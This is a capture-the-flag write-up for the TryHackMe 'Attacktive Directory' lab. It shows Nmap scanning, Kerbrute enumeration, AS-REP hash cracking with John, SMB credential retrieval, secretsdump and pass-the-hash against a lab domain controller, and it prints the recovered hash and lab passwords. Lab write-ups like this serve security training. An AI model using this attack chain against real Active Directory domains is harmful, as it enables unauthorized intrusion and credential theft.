# THM - Attacktive Directory

#### Ip: 10.10.220.178
#### Name: Attacktive Directory
#### Rating: Medium

----------------------------------------------------------------------

AD.png

```text
99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?
```

### Enumeration

As always, lets kick things off by scanning all TCP ports with Nmap. Here I will also use the `--min-rate 10000` flag to speed the scan up.

```text
┌──(ryan㉿kali)-[~/THM/Attacktive_Directory]
└─$ sudo nmap -p-  --min-rate 10000 10.10.229.214                         
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-10 15:26 CDT
Warning: 10.10.229.214 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.229.214
Host is up (0.13s latency).
Not shown: 65426 closed tcp ports (reset), 82 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49673/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49680/tcp open  unknown
49684/tcp open  unknown
49699/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 16.46 seconds
```

Ok, based on the fact that port 53 (DNS) and port 88 (Kerberos) are open, I think we can assume this is the domain controller. Lets enumerate further by scanning the open ports, but this time use the `-sC` and `-sV` flags to use basic Nmap scripts and to enumerate versions too.

```text
┌──(ryan㉿kali)-[~/THM/Attacktive_Directory]
└─$ sudo nmap -sC -sV -T4 10.10.229.214 -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-10 15:27 CDT
Nmap scan report for 10.10.229.214
Host is up (0.13s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-10 20:27:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2023-07-09T20:24:43
|_Not valid after:  2024-01-08T20:24:43
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2023-07-10T20:27:56+00:00
|_ssl-date: 2023-07-10T20:28:06+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-07-10T20:27:54
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.45 seconds
```

Before we get started I'll go ahead and add spookysec.local to the `/etc/hosts` file.

One of my favorite ways to begin enumerating a DC is to use Kerbrute, and see if I can discover any users.

Note: This box provided both a username list as well as a password list to cut down on bruteforcing times. 

kerbrute.png

Nice! Easy win with kerbrute, we were able to drop a hash!

We were also able to drop some usernames, lets go ahead and add these to a file called users.txt before moving on:

```text
┌──(ryan㉿kali)-[~/THM/Attacktive_Directory]
└─$ cat users.txt                
james
robin
darkstar
administrator
backup
paradox
svc-admin
```
We'll also add the svc-admin hash to a file called svc-admin_hash.txt

```text
┌──(ryan㉿kali)-[~/THM/Attacktive_Directory]
└─$ cat svc-admin_hash.txt                       
$krb5asrep$18$svc-admin@SPOOKYSEC.LOCAL:b19c6b88956ab386fc0e062f726378ed$824d45ed346561a693ca7c759f1167542a54c996632cb9c7059ea4835759b3106a03dab262db521df55f9e5b4d41728b41bbd331246ee364799341fdb4dc7037c2e1d510d310e9bce4637b3fabe4b12364fec4072212c4a69ce925b9aed883d4fb9cf03b10884272f217a7c69804e759966ac6ff5f3610593e3c53b501b49f83bda04d84c894f1f25951e51a54c324e9507ac3240a403283018adbcf598b646cea6464b034fb32d1a4ff85ac7f0b77e4e05b7fb6208caeafdd3e0f34f140ecfdceec92bb5de5907c1e79cdbc56137defc1370a50ec0f21c0895c98d76a3f1788d9c899f8e00c9fd0307ea46108ad21cb857e903b02236e1845d1638e70e1d8cbc411fa67af16
```
Which we can then crack using JohnTheRipper. 

```text
┌──(ryan㉿kali)-[~/THM/Attacktive_Directory]
└─$john svc-admin_hash --wordlist=thm_pws.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
management2005   ($krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL)
```

svc-admin:management2005

Note: I worked on this machine over two different sessions; so you'll notice a different target IP adress starting here.

We can use these credentials to login to SMB and see if we can find anything interesting.

cme.png

Cool, looks like quite a few shares we can choose from. Lets take a look at the `/backup` share. We can do this by using smbclient.

```text
┌──(ryan㉿kali)-[~/THM/Attacktive_Directory]
└─$ smbclient -U 'svc-admin' //10.10.105.218/backup    
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 14:08:39 2020
  ..                                  D        0  Sat Apr  4 14:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 14:08:53 2020

		8247551 blocks of size 4096. 3577476 blocks available
smb: \> get backup_credentials.txt 
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

This looks juicy! The file appears to be base64 encoded, lets decode that in the terminal. 

```text
┌──(ryan㉿kali)-[~/THM/Attacktive_Directory]
└─$ cat backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw                                                                                                                             
┌──(ryan㉿kali)-[~/THM/Attacktive_Directory]
└─$ echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d         
backup@spookysec.local:backup2517860
```

Cool, looks like we've got another set of credentials now. 

backup:backup2517860

Aremed with these credentials we can use impacket-secretsdump against the domain and grab some hashes.

secrets.png

Great! We've got the administor's hash now. We should now just be able to perform a simple pass-the-hash and login as the admin. Lets use impacket-psexec for this.

admin.png


All thats left now is to grab the flags! This room requests three flags from different users:

```text
svc-admin
backup
Administrator
```

Lets grab them:

svc-admin

svc_flag.png

backup

backup_flag.png

Administrator

admin_flag.png

And that's all there is to it! Thanks for following along,

-Ryan

----------------------------------------------------------------------------------
